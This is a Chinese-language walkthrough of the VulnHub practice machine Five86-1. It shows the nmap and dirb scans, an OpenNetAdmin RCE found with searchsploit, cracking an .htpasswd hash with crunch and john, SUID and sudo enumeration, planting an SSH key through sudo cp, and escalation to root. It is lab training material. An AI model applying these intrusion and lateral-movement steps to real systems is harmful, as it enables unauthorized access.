---
title: 'Five86-1'
disqus: hackmd
tags: vulnhub writeup
---

0. https://www.vulnhub.com/entry/five86-1,417/

1. 發現主機
```bash
netdiscover
```
![](https://i.imgur.com/8aapA1p.png)

得到服務 IP 192.168.43.137

2. 掃描弱點
```bash
nmap -A -T5 192.168.43.137 # -A 全面性 -T 越高越快
nmap -sT -A 192.168.43.137 # -sT TCP connect scan
```
![](https://i.imgur.com/3OpLe6X.png)
開放 22,80,10000 port，80 port 是個 opennetadmin, 10000 是 webmin

爆破
```bash
dirb http://192.168.43.137
```
有個 `/reports` 需要密碼，`/ona/`是 opennetadmin 管理頁面，版本 1.8

3. Exploit opennetadmin
```bash
searchsploit opennetadmin 
```
![](https://i.imgur.com/zX9qf2y.png)
使用第三個 RCE 成功
![](https://i.imgur.com/HNRXLe0.png)

4. .htaccess

apache 用 .htacess 來設定訪問權限

![](https://i.imgur.com/7XhjIhb.png)

查看 .htpasswd 拿到一組 password hash，存成 hash.txt

![](https://i.imgur.com/LUPYCt1.png)

找提示生成字典檔 `$ crunch 10 10 aefhrt -i wordlist.txt`

爆破 `john -w=wordlist.txt hash.txt` 得到帳密 douglas:fatherrrrr 

5. 寫 ssh key

用 douglas 登入後，查看能幹嘛
find by one & sudo -l
```
$ find / -user root -perm -4000 -print 2>/dev/null
$ find / -perm -u=s -type f 2>/dev/null
$ find / -user root -perm -4000 -exec ls -ldb {} \;
$ sudo -l
```
找到可以以 jen 身分用 /bin/cp

把 ssh public key 寫入 jen .ssh/authorized_keys 
```bash
@Magdalene$ ssh-keygen -b  2048
douglas@five86-1$ sudo -u jen /bin/cp ./authorized_keys /home/jen/.ssh/authorized_keys 
```
用 jen ssh login

6. 查看 mail

jen 登入後提示有新信件
```
$ mail
$ more
```
![](https://i.imgur.com/IrMT5b4.png)

用 moss:Fire!Fire 登入

7. 提權

一樣先 oneheart，發現奇怪的 upyourgame
![](https://i.imgur.com/5aHQf95.png)

跑完就拿 root

8. Pwned

![](https://i.imgur.com/DcWut5M.png)
